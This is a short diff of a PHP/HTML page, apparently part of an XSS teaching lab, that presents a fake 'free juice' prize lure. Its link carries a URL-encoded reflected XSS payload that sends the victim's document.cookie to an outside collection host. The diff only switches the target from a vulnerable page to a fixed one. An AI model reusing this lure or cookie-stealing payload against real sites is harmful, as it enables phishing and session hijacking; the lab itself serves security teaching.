@@ -28,7 +28,7 @@ if(isset($_GET) && $_GET['data']){
     <h1>Winner! Winner!</h1>
     <p> Lucky winner! You won a free juice from the Owasp Juice Shop! Just <a
         href="
-        https://vulnerable-to-hack.herokuapp.com/vulnerable-web/index.php?search=%3Cimg%20src%3D%22x%22%20onerror%3D%22javascript%3Avar%20xmlHttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20%0AxmlHttp.open%28%20%27GET%27%2C%20%27https%3A%2F%2Fmalicious-web.herokuapp.com%2Findex.php%3Fdata%3D%27%2Bdocument.cookie%2C%20false%20%29%3B%20xmlHttp.send%28%20null%20%29%3B%22%3E
+        https://vulnerable-to-hack.herokuapp.com/fixed-web/index.php?search=%3Cimg%20src%3D%22x%22%20onerror%3D%22javascript%3Avar%20xmlHttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20%0AxmlHttp.open%28%20%27GET%27%2C%20%27https%3A%2F%2Fmalicious-web.herokuapp.com%2Findex.php%3Fdata%3D%27%2Bdocument.cookie%2C%20false%20%29%3B%20xmlHttp.send%28%20null%20%29%3B%22%3E
         ">click
         here</a> to claim! </p>
   </center>
